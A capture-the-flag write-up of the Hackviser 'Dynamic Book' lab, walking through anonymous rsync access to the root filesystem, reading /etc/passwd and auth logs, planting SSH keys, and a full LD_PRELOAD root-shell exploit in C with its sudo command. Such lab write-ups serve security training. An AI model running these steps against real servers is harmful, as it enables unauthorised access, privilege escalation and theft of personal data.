# Dynamic Book – Hackviser Warm-Up Lab

## 📌 Lab Overview
Dynamic Book is a warm-up machine that focuses on exploiting a misconfigured **rsync service** to gain initial access and then performing **privilege escalation using LD_PRELOAD**.

---

## 🎯 Objectives
- Enumerate exposed services
- Exploit rsync misconfiguration
- Gain SSH access
- Escalate privileges to root using LD_PRELOAD
- Extract sensitive information from backup files

---

## 🧪 Enumeration
---

### 🔹 Port Scan
```bash
nmap -sV 172.20.7.121
Discovered services:
22/tcp – SSH
873/tcp – rsync
---

🔍 Rsync Enumeration
rsync 172.20.7.121::
Output revealed a shared module:
root   Backup server
-----
📂 Accessing Shared Files
rsync 172.20.7.121::root
The root (/) directory was exposed via rsync.
We downloaded the rsync configuration file:
rsync 172.20.7.121::root/etc/rsyncd.conf .
Key findings:
uid = 1001
Service running as sasha user
----
👤 User Identification
rsync 172.20.7.121::root/etc/passwd .
Confirmed:
sasha:x:1001:1001:/home/sasha:/bin/bash
---
📑 Log Analysis
rsync 172.20.7.121::root/backups/log/auth.log.1 .
Found successful SSH login attempts for sasha.
---
🔐 Gaining SSH Access
Generated SSH keys and uploaded them via rsync:
ssh-keygen -t rsa
cat id_rsa.pub > authorized_keys
rsync -r ~/.ssh 172.20.7.121::root/home/sasha/
Connected via SSH:
ssh sasha@172.20.7.121
----
🚀 Privilege Escalation (LD_PRELOAD)
Discovered sudo access to:
/usr/local/bin/sys_helper
LD_PRELOAD was enabled.
Exploit Code
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
Compiled shared object:
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so exploit.c
Executed:
sudo LD_PRELOAD=/tmp/preload.so /usr/local/bin/sys_helper
✅ Root access achieved.
---
🗂 Data Extraction
Analyzed backup files:
flights_2022.backup.sql
passengers.backup.sql
Target result:
Passenger: Gabie Norton
----
✅ Conclusion
Successfully exploited rsync misconfiguration
Gained SSH access as user sasha
Escalated privileges to root
Extracted sensitive backup data
💪 Lab successfully completed.
